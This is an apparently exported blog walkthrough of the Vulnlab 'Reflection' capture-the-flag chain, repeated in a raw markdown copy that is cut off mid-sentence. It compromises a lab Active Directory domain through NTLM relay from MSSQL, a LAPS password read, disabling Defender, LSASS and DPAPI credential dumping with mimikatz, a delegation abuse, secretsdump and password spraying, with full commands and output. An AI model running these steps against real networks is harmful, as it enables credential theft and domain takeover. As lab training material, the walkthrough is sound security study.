impacket-secretsdump -k ws01.reflection.vl                                  \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Service RemoteRegistry is in stopped state\n[*] Service RemoteRegistry is disabled, enabling it\n[*] Starting service RemoteRegistry\n......\nREFLECTION\\WS01$:aad3b435b51404eeaad3b435b51404ee:755b20085[...snip...]4c9e:::\n[*] DefaultPassword \nreflection.vl\\Rhys.Garner:[...snip...]\n```\n\nThis will eventually dump the password for `Rhys.Garner`, who is a local administrator on `WS01`. This means using their credentials we should be able to authenticate to RDP to this workstation. I found that WinRM authentication wasn't working me, so RDP is another alternative.\n\n![](/images/vulnlab/reflection-vl/h.png)\n\nAs you can see, the second flag is within the Desktop directory for this user.\n\n# Pivoting to DC01\n\nSo our next and final step to compromising this environment is to take control over the DC from here. Note that if we want to get a session as SYSTEM on `WS01`, we can use Sliver's built-in `getsystem` command which will spawn a new session as SYSTEM.\n\nI tried a few different tactics such as viewing the cached Kerberos credentials on this machine, to which I found that there was an `LDAP` cached ticket for `Rhys.Garner` from the DC. I tried a few tactics that came to mind when I saw this, such as requesting for an alternate service name for CIFS on the DC. That did not seem to work, so I decided to pivot elsewhere. There are also no credentials or applications that we could exploit on this machine, so the exploit has to be externally through AD ACLs.\n\nNow when I had figured out what to do, it seemed incredibly simple in hindsight. This is a tactic that is always worth a try to give if you have credentials, which is the idea of password reusage. Spraying passwords that you currently own to other users is never a bad idea unless you're in an environment that restricts brute-forcing. In our case, that does not seem to be an issue.\n\nI pulled all of the users from Bloodhound and placed them into a wordlist, you can do so just simply by creating a text file and reading from all of the domain user nodes.\n\n```\n└─$ cat ul.txt    \ndom_rgarner\nsvc_web_prod\nsvc_web_staging\ndeborah.collins\njeremy_marshall\nrhys.garner\ndylan.marsh\ndorothy.rose\ncraig.williams\nbethany.wright\nabbie.smith\nmichael.wilkinson\nlabadm\ngeorgia.price\n```\n\nNow that we have this user list, let's see if `georgia.price` shares a password with any of these users. We can do so with `crackmapexec`.\n\n```\n└─$ crackmapexec smb 10.10.255.149 -u ul.txt -p '[...snip...]'   \nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.149   445    DC01             [+] reflection.vl\\dom_rgarner:[...snip...] (Pwn3d!)\n```\n\nWe can see that a successful authentication attempt came back for `dom_rgarner`. I verified that the user `dom_rgarner` is a domain admin and also has access to WinRM on the DC. You can view this in Bloodhound on the user's node.\n\nSo given that we have access to a domain admin, we can now take hold of the DC and authenticate to it to complete this chain. \n\n```\n└─$ evil-winrm --ip 10.10.255.149 -u 'dom_rgarner' -p '[...snip...]'\n \nEvil-WinRM shell v3.5\n   \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents> cat C:\\Users\\Administrator\\Desktop\\flag.txt\n[...snip...]\n*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents> hostname\ndc01\n```\n\nAs seen above, we are able to read the last flag within the Administrator home directory. This means that we have successfully compromised this chain!\n\n![](/images/vulnlab/reflection-vl/i.png)\n\n# Conclusion\n\nThis chain was very fun, and it definitely was a hard-hitter for Windows pivoting and privilege escalation. Learning how to do NTLM relay was very different, and I believe that it definitely helped with strengthening some skills. Big thanks to xct and r0BIT for developing this chain, it was great!\n\n# Resources\n\nhttps://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/BloodHoundAD/BloodHound\nhttps://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\nhttps://github.com/BishopFox/sliver\nhttps://github.com/ParrotSec/mimikatz\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nhttps://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\nhttps://dan-feliciano.com/2024/06/05/tengu/\nhttps://github.com/GhostPack/Seatbelt\n\n","source":"_posts/reflection.md","raw":"---\ntitle: Reflection - Vulnlab\ndate: 2024-06-22 20:31:39\ntags: [vulnlab, Medium, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.\ncover: /images/vulnlab/reflection-vl/reflection_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\n\nReflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.\n\n# Enumeration\n\nOur three machines are `10.10.255.149-151`. We'll query each of these with the NMAP scans that we usually run.\n\n```\n└─$ sudo nmap 10.10.255.149 && sudo nmap 10.10.255.150 && sudo nmap 10.10.255.151\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT\nNmap scan report for 10.10.255.149\nHost is up (0.12s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1433/tcp open  ms-sql-s\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT\nNmap scan report for 10.10.255.150\nHost is up (0.11s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n1433/tcp open  ms-sql-s\n3389/tcp open  ms-wbt-server\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:19 EDT\nStats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 0.65% done\nNmap scan report for 10.10.255.151\nHost is up (0.11s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 20.11 seconds\n```\n\nIt seems that this environment is solely Windows Active Directory, with no domain-joined Linux machines available. We have a domain controller running on `.53` given that both Kerberos and the DNS services are running on that machine. We then have two workstations on `.150` and `.151`, from which `.150` seems to be a workstation with an external facing MSSQL service (which is already a vulnerability).\n\nNote that if you wanted to view the domain names for each of the machines, I learned that you don't have to use NMAP scripts to do so. You can simply use `crackmapexec` to query SMB on all of the workstations, as all of them contain this service.\n\n```\n└─$ crackmapexec smb 10.10.255.149-167\nSMB         10.10.255.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)\n```\n\nGiven that both `MS01` and `WS01` have SMB and RDP running, my first guess is for us to attempt to interact with these services for any null authentication. We'll give those a go starting with SMB with the below commands.\n\n```\n└─$ smbclient -L 10.10.255.(150 or 151) -N\n\n└─$ smbclient -L 10.10.255.150 -N\n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nstaging         Disk      staging environment\n```\n\nIt seems that on `MS01` (the workstation running MSSQL) allows us to list shares with null authentication. Furthermore, the share `staging` seems to be an uncommon name for a share so we'll query this to see if there's anything we can find.\n\n```\n└─$ smbclient \\\\\\\\10.10.255.150\\\\staging -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jun  7 13:42:48 2023\n  ..                                  D        0  Wed Jun  7 13:41:25 2023\n  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023\n\n                6261245 blocks of size 4096. 1166816 blocks available\nsmb: \\> get staging_db.conf\ngetting file \\staging_db.conf of size 50 as staging_db.conf (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\nsmb: \\> exit\n```\n\n# MSSQL Enumeration on MS01\n\nWe have access to the `staging_db.conf` being the only file in this share, so we'll pull it to our localhost to see if it has any important information.\n\n```\n└─$ cat staging_db.conf \nuser=web_staging\npassword=Washroom510\ndb=staging\n```\n\nThe configuration file seems to have credentials for us for the `web_staging` user. I ran a few of these through crackmapexec to see if they're valid credentials to the domain controller, however it does not seem that we can use it to query the DC.\n\nI gave a few of the services that are local to `MS01` a try such as SMB or RDP, however our credentials don't seem to work to those services. Let's look at the MSSQL service specifically, I had the initial thought that these credentials went there however I wanted to test for password reusage in the other areas of the environment before moving on.\n\n```\nSQL (web_staging  dbo@staging)> select * from users;\nid   username   password        \n--   --------   -------------   \n 1   b'dev01'   b'Initial123'   \n\n 2   b'dev02'   b'Initial123'\n```\n\nIt seems like we have credentials from for two users, `dev01` and `dev02`. Unfortunately, I ran a few tests against CME as these users and it seems that there isn't much that we can access from these users.\n\n# NTLM Relay to DC01\n\nThis lead me down to a new type of attack that we can exploit that follows a similar title to the name of the box. When I think of the word \"Reflection\", the first type of attack with a similar connotation that comes to mind is relaying. There are various types of relaying attacks such as SMB, SMTP, or NTLM relay, so we'll need to understand what we're dealing with in order to determine the type of relay attack.\n\nEssentially our goal is to relay another user's credentials that we do NOT know. At a low-level, this is essentially what relaying will do for us; relay a user's authentication from one service on one machine to another service (potentially on another). I want to stress that this exploit is helpful when you're able to trigger authentication attempts and relay them from an account that you do NOT own to another service.\n\nOur current situation may not seem to have those prerequisites, since we aren't aware of any other users and their respective passwords. While we initially think that we only have access to three users currently, we actually have access to one more.\n\nThe way I interpreted this may be incorrect and someone can feel free to correct on this if need be, however the fourth account that we can force an authentication attempt against is actually right in MSSQL. You see, when you execute a command in MSSQL or when you execute a query, it's the service account that actually queries that information for you. While we don't know the specific username to the service account (which can vary from box to box), we can force it to authenticate to a machine that we own.\n\nThis can be done by utilizing the `xp_dirtree` MSSQL command built into Impacket, which essentially allows us to query a folder on the local host. This can also however, be used to query folders on remote hosts. This means we can point the directory listing command back to our local Kali machine. Our goal is to relay the authentication, however I just want to show the proof-of-concept of what I mean before we continue.\n\nWe can boot up `responder` on a separate terminal pane with `sudo responder -I (VPN interface)`.\n\n![](/images/vulnlab/reflection-vl/b.png)\n\nAs you can from the above, a successful hash was captured for `svc_web_staging`. While we probably can't crack the hash for this account, this does prove that we have the ability to relay the credentials.\n\nTo do this, we can use a tool from Impacket called [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). This tool will relay the NTLM hash that we can see much like in Responder and use that NTLM hash to authenticate to another service. We can relay the credentials to any service on a target machine, should that service allow for NTLM authentication and allows `svc_web_staging` to authenticate to it. Let's try SMB, though you could also point it to the MSSQL service on the DC if you'd like.\n\nWe can start `ntlmrelayx` with the below command, ensuring that we specify the `-i` option for an interactive session.\n\n```\n└─$ impacket-ntlmrelayx -t smb://10.10.255.149 -smb2support -i\n```\n\nThis should launch about over 10 protocols that will listen for incoming requests, much like Responder did. All that's left now is to query our localhost on the MSSQL workstation and forward the request to SMB.\n\n![](/images/vulnlab/reflection-vl/c.png)\n\nAs you can see, an SMB client shell was started on our local machine on port 11000. We can connect to this easily using netcat. Be sure that you do NOT close out of `ntlmrelayx` until we've finished using the local shell.\n\n# SMB/MSSQL Enumeration on DC01\n\n```\n└─$ nc 127.0.0.1 11000\nType help for list of commands\n# help\n\n open {host,port=445} - opens a SMB connection against the target host/port\n```\n\nWe seem to have a semi-interactive SMB shell, which has successfully connected to the DC through NTLM relay. We can now enumerate the SMB shares in the context of `svc_web_staging`. You can enumerate shares with the `shares` command.\n\n```\n# shares\nADMIN$\nC$\nIPC$\nNETLOGON\nprod\nSYSVOL\n# use prod\n# ls\ndrw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .\ndrw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..\n-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf\n```\n\nAs you can see from the above, there is a `prod_db.conf` file within the `prod` share, we'll grab this to see if there's anything we can find within it. You can do so with a simple `get` command.\n\n```\n└─$ cat prod_db.conf\nuser=web_prod\npassword=[...snip...]\ndb=prod\n```\n\nThis file contains the password for `web_prod`, who I would assume much like `web_staging` is able to authenticate regularly to the MSSQL service on the DC. While you can't verify this with `crackmapexec` as this requires your request to go to LDAP (which is currently blocking logins from untrusted domains).\n\nHowever if we attempt to log-in with Impacket, we can see that the request travels through as intended.\n\n```\n└─$ impacket-mssqlclient reflection.vl/'web_prod':'[...snip...]'@10.10.255.149                     \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (web_prod  guest@master)>\n```\n\nLet's enumerate a little further into a few of the tables, I noticed immediately that there was a different table in this MSSQL service titled `prod`, so we'll look into that. \n\nNote that if you relayed your `svc_web_staging` NTLM credentials to MSSQL when we were performing NTLM relay earlier, you would NOT have access to this database. This is because only `web_prod` is able to query it, meaning you would have to relay to SMB anyways. You'd be able to verify that the `prod_db.conf` file exists since you can query the local filesystem with `xp_dirtree` and you would notice that you can view the SMB shares from the `C:\\` drive.\n\n```\nSQL (web_prod  guest@master)> use prod\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'prod'.\nSQL (web_prod  dbo@prod)> select table_name from information_schema.tables\ntable_name   \n----------   \nusers\n```\n\nAs you can see, there is a similar `users` table within this database, so let's query it to see if there are any other credentials we can receive.\n\n```\nSQL (web_prod  dbo@prod)> select * from users\nid   name              password            \n--   ---------------   -----------------   \n 1   b'abbie.smith'    b'[...snip...]'   \n\n 2   b'dorothy.rose'   b'[...snip...]'\n```\n\nThis gives us the credentials to both `abbie.smith` and `dorothy.rose`, both being domain users within the AD instance of this chain. At this point - we should be fine to close out of NTLM relay for now as we won't need it anymore.\n\n# Domain Enumeration with Bloodhound\n\nWhile we weren't able to query LDAP earlier since we were using accounts that cause the untrusted domain rule to execute, we now have proper domain user credentials meaning we can query LDAP as we normally would. Let's dump the domain with these credentials using the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'reflection.vl' -u 'abbie.smith' -p '[...snip...]' -c all -ns 10.10.255.149 --zip\n```\n\nNow that we have all of the domain objects dumped to a compressed archive, we can load these into [Bloodhound](https://github.com/BloodHoundAD/BloodHound).\n\nAfter uploading them to the Bloodhound database, let's take a look at some of the users that we can potentially exploit to get onto one of the workstations. Note that although you have credentials to `abbie.smith` and `dorothy.rose`, they do NOT have access to WinRM or RDP or either of the `WS01` or `MS01` workstations.\n\nWhen looking around at the accounts that we currently have control over, I noticed that one of the users, `abbie.smith`, has a notable outbound object control. \n\n![](/images/vulnlab/reflection-vl/d.png)\n\nIt seems that `abbie.smith` has `GenericAll` over the `MS01` workstation. This specific object control is otherwise known as full control, meaning the `MS01` workstation allows `abbie.smith` to manipulate it however it may wish. Normally if we had `GenericAll` over a domain user, we would just be able to change the domain user's password with `bloodyAD`. That being said, we have this privilege over the machine itself instead of a specific user.\n\nThere are a few things that we can try, notably resource-based constrained delegation (RBCD) or local administrator password solution (LAPS) exploitation. The only issue with RBCD is that we do not have control of a machine that has an SPN set to do this. We also can't add a computer due to both `abbie.smith` and `dorothy.rose` having a MachineAccountQuota (MAQ) value of 0. We would need a MAQ value of either 1 or above to be able to do this.\n\n# Reading LAPS Password for MS01\n\nThus, let's try exploiting [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview). This specific service is a Windows feature within most Active Directory environments and Microsoft Entra environments. It essentially backs up the password of the local administrator account of the machine it is enabled on and acts like a cache that stores the respective administrator password. Due to us having `GenericAll` over the machine account, we can read the LAPS password of the Administrator account on this workstation.\n\nEasily enough `crackmapexec` has a built-in module to do this, which will dump the LAPS password of the `MS01` machine. We'll need to point our request to LDAP on the DC first before specifically reading the LAPS password of the Administrator on `MS01`.\n\n```\n└─$ crackmapexec ldap 10.10.255.149 -u 'abbie.smith' -p '[...snip...]' --kdcHost 10.10.255.150 -M laps\nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nLDAP        10.10.255.149   389    DC01             [+] reflection.vl\\abbie.smith:[...snip...]\nLAPS        10.10.255.149   389    DC01             [*] Getting LAPS Passwords\nLAPS        10.10.255.149   389    DC01             Computer: MS01$                Password: [...snip...]\n```\n\nAs you can see, the password was dumped successfully. Note that this exploit would only work if LAPS was actually running on the target and we had the respective privilege to be able to dump it.\n\nNow that we have the password for that user, we should be able to log in as them. Although testing your credentials `crackmapexec` onto services such as WinRM or RDP on this workstation would come back negative, you can still log in as you normally would through either of those services. Let's use them to log in to WinRM using `evil-winrm`.\n\n```\n└─$ evil-winrm --ip 10.10.255.150 -u 'Administrator' -p '[...snip...]' \n    \nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat C:\\Users\\Administrator\\Desktop\\flag.txt\n[...snip...]\n```\n\nNow that we have control over the `MS01` workstation, we can read the first flag as seen above.\n\n# Pivoting to WS01\n\nLet's now turn our attention to the next part of the chain, as we'll need to escalate to the other workstations on the environment. Given the rule of thumb with these chains, I'm assuming that we'll need to compromise `WS01` first before the DC.\n\nWe'll take a look at Bloodhound again to see if there are any domain user objects that we can use pivot to `WS01`. I first searched through the `domain users` group and selected all of the `Direct Members` to view every user account on the domain. \n\nI immediately saw something different here with another user on the domain, that user being `Georgia.Price`.\n\n![](/images/vulnlab/reflection-vl/e.png)\n\nAs you can see from the screenshot above, it seems as though `Georgia.Price` has the same `GenericAll` permissions that `abbie.smith` had, this time being on `WS01`. This means with `Georgia.Price`'s credentials, we should be able to either read the LAPS password or exploit RBCD on `WS01`. The only stipulate here is that we do not current possess those credentials.\n\n# Credential Hunting on MS01\n\nNow that we have the ability to enumerate `MS01`, we can do a bit of credential hunting to see if we can find the password for `Georgia.Price`. I stood up a [Sliver C2](https://github.com/BishopFox/sliver) server so we can easily transfer files without needing to curl our binaries to the respective machines we control.\n\nWe'll need to disable AV first before getting our implant onto `MS01`, we have the ability to do that given that we are the Administrator on the machine.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Set-MpPreference -DisableRealTimeMonitoring $true\n```\n\n![](/images/vulnlab/reflection-vl/f.png)\n\nThere are a few things that we can do to try and hunt for this password, I'll show three methods that I tried initially before showing the solution. While these first two solutions are not the answer for retrieving the credentials for `Georgia.Price`, they are helpful to try in other scenarios.\n\nFirstly what comes to mind, since we have access to the local Administrator account on `MS01`, we can dump all of the cached credentials in memory. We'll do so by dropping [Mimikatz](https://github.com/ParrotSec/mimikatz) to the filesystem.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n[...snip...]\nmimikatz(commandline) # exit\n```\n\nThis should dump all of the cached credentials, though none of them seem to be of use. If `Georgia.Price` did have a cached credential, it would be here. We do see `svc_web_staging`'s plaintext password, however this doesn't seem to be of help to us.\n\nNext thing we could try is retrieving the LSASS from this machine and reading the machine secrets to see if there are any passwords stored here. You might think that we just did that with Mimikatz above, however doing this can also dump the master keys and GUIDs for any cached DPAPI credentials stored on the machine.\n\nFirst, you'll need to dump the LSASS on the remote machine. While you can do it straight from Sliver, this is incredibly loud and also the potential to crash your session since AV can still track this large handle even though we've disabled it in our current process. There are alternatives to this, notably using [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) which is not picked up by AV as a malicious executable. The great thing about using `procdump` is that I found the executable for it within `C:\\Tools`, meaning we don't need to transfer it from our Kali machine.\n\n```\n*Evil-WinRM* PS C:\\Tools> .\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp\n*Evil-WinRM* PS C:\\Tools> mv lsass.dmp C:\\Users\\Administrator\\Documents\n```\n\nNow that we have the LSASS dumped to a file, we'll put it to our Kali machine through Sliver and read it with `pypykatz`.\n\n```\n└─$ pypykatz lsa minidump lsass.dmp\n[...snip...]\n== DPAPI [3e7]==\nluid 999\nkey_guid d0486e64-ff99-4f38-8962-56d7767effbd\nmasterkey ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0\nsha1_masterkey 21a9c244e05002762c3b3f51845a58677a921e2e\n== DPAPI [3e7]==\nluid 999\nkey_guid e233b32e-4d94-4f33-8404-b89d08003375\nmasterkey 73694a6e64f4ff7947bdad1cc3fe941df4deb26b33060405eab4ce3225db174bd6e0045c1dd2d7b50403f60fc9ce01b908f1925c937f77be3fa85e24db2c6d68\nsha1_masterkey 10134d260068b772beec3f5c7e8a6828b68d2023\n== DPAPI [3e7]==\nluid 999\nkey_guid ea60aa58-d914-4cb4-a993-ca09a343fc78\nmasterkey a91c09519bbf0b28ca662f8c0b8f680b5902f9e99438df44d6e2563ca5156259ece153cc041dce1dca518f633d299adb530d37686218a5d84e409a600468b20d\nsha1_masterkey b4ac52b7d91b71f7010a9aed39e35ea92e8391b0\n```\n\nWe'll take note of these DPAPI credential master keys for now.\n\nLastly, you can also try enumerating scheduled tasks. We can do so by dumping all tasks and their attributes using `schtasks` in our WinRM session. I learned to do during my time doing [Tengu](https://dan-feliciano.com/2024/06/05/tengu/), which is also a great machine to try for practice.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> schtasks /query /v /fo LIST > tasklist.txt\n```\n\nWe can pull this to our local Kali machine through Sliver to read it. I found an interesting task denoted as `\\Backup` that seems to be owned by `Georgia.Price`.\n\n![](/images/vulnlab/reflection-vl/g.png)\n\nThis task seems to be running as that user, which prompts us to attempt to see if we can edit it. Luckily enough we don't have to do that through PowerShell, as we have Administrator access to RDP so we can just do it through the Task Scheduler GUI. The only issue with this method is that we are required to enter `Georgia.Price`'s credentials in order to edit the scheduled task. If we had the ability to do this, we could easily MITM the `ls` request and point it to Responder, to which we could then try to crack the NetNTLMv2 hash that we'd receive.\n\n# Dumping DPAPI Cached Credentials\n\nSo pulling this all together, it does not seem that any of the aforementioned methods are usable to receive `Georgia.Price`'s plaintext credentials. However, as I showed from before we do have access to a few master keys that may correspond to cached DPAPI credentials.\n\nWe can run [Seatbelt](https://github.com/GhostPack/Seatbelt) from Sliver C2, you could also compile it with Visual Studio and drop the executable to the filesystem. The Sliver armory contains `seatbelt` so we'll just do it from there.\n\n```\nsliver (reflection) > seatbelt WindowsCredentialFiles\n......\n  Folder : C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\n\n    FileName     : 2A5FD8B6E555858DE1974096F0A5DD39\n    Description  : Local Credential Data\n    MasterKey    : d0486e64-ff99-4f38-8962-56d7767effbd\n    Accessed     : 6/7/2023 12:22:44 PM\n    Modified     : 6/7/2023 12:22:44 PM\n    Size         : 576\n```\n\nIf you remember earlier, the master key was a relatively long string of text at the bottom of our DMP file. That is the unencrypted master key, which normally we would use the corresponding GUID to decrypt it. Luckily enough, now that we have the decrypted master key, we just need to plug the right one into its respective credential file.\n\nI left one of the credential files in the above output as it corresponds to the GUID that was listed for one of the DPAPI master keys from the DMP file. There is another credential file with the same GUID, however I found after some testing that it is not the correct credential file for us to exploit. This just takes some trial and error if you have the same GUID for multiple master keys.\n\nIf we have the correct master key and its corresponding credential file, we should be able to dump the credential blob (otherwise being the plaintext password) for the user it belongs to. I'll put all of the respective attributes that we have to dump the credential blob.\n\n* Key GUID - `d0486e64-ff99-4f38-8962-56d7767effbd`\n* Master Key - `ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0`\n* Credential File - `C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39`\n\nGiven that we have all of the assets required, let's use Mimikatz once more to dump the credential blob. I've found that running through WinRM prompts an error, however if you log in as the Administrator through RDP it should work as intended.\n\n```\nPS C:\\Users\\Administrator\\Documents> .\\mimikatz.exe \"dpapi::cred /in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39 /masterkey:ca00bf269b1c1879ad1d664d6fadd9d4169b408e95[...snip...]3f1c55d5b772d3d404c520c886413321af99caf0\" \"exit\"\n\n......\n  TargetName     : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370}\n  UnkData        : (null)\n  Comment        : (null)\n  TargetAlias    : (null)\n  UserName       : REFLECTION\\Georgia.Price\n  CredentialBlob : [...snip...]\n  Attributes     : 0\n```\n\nAs you can see, this credential file seemed to correspond to `Georgia.Price`. Our theory for task scheduler from before was half correct, as the plaintext password for the user is stored on this task. The credential blob that we dumped corresponded to this specific task scheduler credential attribute, as this is where it is stored.\n\n# Exploiting Resource-Based Constrained Delegation\n\nWe can now use the `GenericAll` permissions as `Georgia.Price` to exploit the `WS01` workstation.\n\nI tested for LAPS once again to see if we could read the corresponding LAPS password, however I did not come back with any results. This is because unlike `MS01`, `WS01` does not have LAPS configured to run.\n\nDespite this, we do have another exploit that we can test - RBCD. Resource-based constrained delegation essentially allows us to utilize a compromised machine account to request for a service ticket in which we impersonate the user that it belongs to. The reason that this did not work before is that we did not have control over a machine account that could do this. However, now that we do have one being `MS01$`, we can exploit this functionality.\n\nWe'll first need to set the delegation properties between `MS01$` and `WS01$` respectively so that `MS01` can perform delegation on behalf of users in `WS01`. Impacket has a utility to do this.\n\n```\n└─$ impacket-rbcd -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'reflection.vl/georgia.price:[...snip...]'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)\n```\n\nNow that we have that set, we can now exploit S4U2Proxy to request for a service ticket to CIFS (being SMB) as the Administrator user.\n\nThe only stipulate here is that we'll need the plaintext password of the `MS01$` machine account to do this. We did dump all the credentials to the `MS01` machine earlier from Mimikatz, so we can use the machine account's NTLM hash and pass-the-hash to Impacket command we're about to run.\n\n```\n└─$ impacket-getST -spn 'cifs/ws01.reflection.vl' -impersonate 'Administrator' 'reflection.vl/MS01$' -hashes :548f3a[...snip...]0eaadb1\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache\n```\n\nNow that we have a saved Kerberos service ticket as the Administrator user, we can now dump the secrets of `WS01` remotely with `secretsdump`.\n\n```\n└─$ impacket-secretsdump -k ws01.reflection.vl                                  \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Service RemoteRegistry is in stopped state\n[*] Service RemoteRegistry is disabled, enabling it\n[*] Starting service RemoteRegistry\n......\nREFLECTION\\WS01$:aad3b435b51404eeaad3b435b51404ee:755b20085[...snip...]4c9e:::\n[*] DefaultPassword \nreflection.vl\\Rhys.Garner:[...snip...]\n```\n\nThis will eventually dump the password for `Rhys.Garner`, who is a local administrator on `WS01`. This means using their credentials we should be able to authenticate to RDP to this workstation. I found that WinRM authentication wasn't working me, so RDP is another alternative.\n\n![](/images/vulnlab/reflection-vl/h.png)\n\nAs you can see, the second flag is within the Desktop directory for this user.\n\n# Pivoting to DC01\n\nSo our next and final step to compromising this environment is to take control over the DC from here. Note that if we want to get a session as SYSTEM on `WS01`, we can use Sliver's built-in `getsystem` command which will spawn a new session as SYSTEM.\n\nI tried a few different tactics such as viewing the cached Kerberos credentials on this machine, to which I found that there was an `LDAP` cached ticket for `Rhys.Garner` from the DC. I tried a few tactics that came to mind when I saw this, such as requesting for an alternate service name for 